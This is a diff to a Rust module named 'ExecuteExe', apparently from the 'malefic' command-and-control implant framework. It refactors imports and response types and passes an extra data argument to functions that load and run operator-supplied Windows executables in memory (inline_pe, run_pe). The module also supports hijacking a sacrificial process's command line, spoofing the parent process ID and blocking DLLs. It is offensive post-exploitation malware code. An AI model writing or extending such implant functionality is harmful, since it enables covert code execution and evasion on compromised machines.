@@ -1,13 +1,14 @@
-use std::{convert::TryFrom, ptr::null};
+#![allow(unused_assignments)]
+use std::ptr::null;
 use async_trait::async_trait;
-use malefic_helper::{common::format_osstring, win::kit::pe::{inlinepe::inline_pe, runpe::run_pe, unload_pe}};
+use malefic_proto::proto::implantpb::spite::Body;
+use malefic_helper::win::kit::pe::{inlinepe::inline_pe, runpe::run_pe};
 
-use crate::{check_request, to_error, Module, Result, TaskResult};
+use crate::{check_request, Module, Result, TaskResult};
 use malefic_trait::module_impl;
-use malefic_helper::{
-    common::format_cmdline,
-    protobuf::implantpb::{Arch, AssemblyResponse, spite::Body},
-};
+use malefic_helper::common::format_cmdline;
+use malefic_proto::proto::modulepb::BinaryResponse;
+use crate::execute::Arch;
 
 pub struct ExecuteExe {}
 
@@ -17,9 +18,9 @@ impl Module for ExecuteExe {
     #[allow(unused_variables)]
     async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
         let request = check_request!(receiver, Body::ExecuteBinary)?;
-        let arch = Arch::try_from(request.arch).unwrap_or(Arch::X8664);
-        let is_x86 = matches!(arch, Arch::I686);
+        let is_x86 = matches!(Arch::from_u32(request.arch), Some(Arch::I686));
         let entrypoint = request.entry_point;
+        let data = request.data;
 
         let mut result: Vec<u8> = Vec::new();
 
@@ -37,6 +38,7 @@ impl Module for ExecuteExe {
                     hijack_commandline.as_bytes(),
                     &request.bin,
                     entrypoint.as_bytes(),
+                    &data,
                     is_x86,
                     sacrifice.ppid,
                     sacrifice.block_dll,
@@ -66,8 +68,9 @@ impl Module for ExecuteExe {
             }
         }
 
-        Ok(TaskResult::new_with_body(id, Body::AssemblyResponse(AssemblyResponse{
+        Ok(TaskResult::new_with_body(id, Body::BinaryResponse(BinaryResponse{
             status: 0,
+            message: Vec::new(),
             data: result,
             err: "".to_string(),
         })))
